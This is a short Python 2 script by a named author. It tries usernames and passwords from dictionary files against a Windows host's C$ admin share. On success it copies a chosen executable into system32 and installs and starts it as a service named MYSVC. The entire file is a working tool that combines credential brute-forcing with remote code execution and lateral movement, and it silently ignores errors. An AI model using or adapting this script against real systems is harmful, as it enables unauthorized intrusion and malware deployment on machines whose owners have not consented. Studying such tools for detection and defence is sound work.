#
# Author: Javier Vicente Vallejo, @vallejocc, http://www.vallejo.cc
#
# With this script it is possible to connect a remote machine, copy an executable and execute remotely the copied executable.
#
# Parameters:
#
#   python remoteexec.py <ip target machine> <username | path to dictionary> <password | path to dictionary> <path to exe>
#
#   If username is a path to a file, file lines are used as usernames (the script will try all the usernames. If it is not a file, the parameter is used as username.
#   With password is the same behaviour, if password is a path to a file, file lines are used as passwords (the script will try all the passwords for all usernames). If it is not a file, the parameter is used as password.
#  

import sys
import os
from win32wnet import WNetAddConnection2, WNetCancelConnection2, NETRESOURCE 
from win32service import CreateService, OpenSCManager, CloseServiceHandle, StartService, OpenService
import shutil
import time
import win32api

############################################################

def get_used_drive_letters():
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    letters = [d[0] for d in drives]
    return letters

def get_unused_drive_letters():
    alphabet = map(chr, range(ord('A'), ord('Z')+1))
    used = get_used_drive_letters()
    unused = list(set(alphabet)-set(used))
    return unused

def get_highest_unused_drive_letter():
    unused = get_unused_drive_letters()
    highest = list(reversed(sorted(unused)))[0]
    return highest

############################################################

def dowork(paramtarget, paramusername, parampassword, paramsrcexe):

    localdrv = get_highest_unused_drive_letter()
    if not localdrv: return
    localdrv = localdrv + ":"
    
    print "Using localdrv %s" % localdrv
    
    resource = NETRESOURCE() 
    resource.lpRemoteName = r'\\%s\c$' % paramtarget
    resource.lpLocalName = localdrv
    username = paramusername
    password = parampassword
    
    print resource.lpRemoteName
    print resource.lpLocalName
    
    res = WNetAddConnection2(resource, Password=password, UserName=username) 
    
    try:shutil.copy(paramsrcexe, "%s\\windows\\system32\\mysvc.exe" % localdrv)
    except:pass
    
    try:scman = OpenSCManager(paramtarget, None, 0xF003F)
    except:return
    
    SERVICE_WIN32_OWN_PROCESS = 0x10
    SERVICE_DEMAND_START = 0x3
    SERVICE_ERROR_IGNORE = 0x0
    
    try:hsrv = CreateService(scman, "MYSVC", "MYSVC", 0xF01FF, SERVICE_WIN32_OWN_PROCESS, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, "c:\\windows\\system32\\mysvc.exe", None, 0, None, None, None)
    except:hsrv = OpenService(scman, "MYSVC", 0xF01FF)
    
    try:StartService(hsrv, [""])
    except:pass
    
    try:CloseServiceHandle(hsrv)
    except:pass
    
    WNetCancelConnection2(localdrv, 0, 0)

############################################################
               
lusers = []
lpasswords = []                        
                        
if os.path.isfile(sys.argv[2]):
    f = open(sys.argv[2], "r")
    lusers = map(str.strip, f.readlines())
    f.close()
else:
    lusers.append(sys.argv[2])

if os.path.isfile(sys.argv[3]):
    f = open(sys.argv[3], "r")
    lpasswords = map(str.strip, f.readlines())
    f.close()
else:
    lpasswords.append(sys.argv[3])

for u in lusers:
    for p in lpasswords:
        try:
            print "Trying %s %s" % (u, p)
            dowork(sys.argv[1], u, p, sys.argv[4])
        except:
            pass
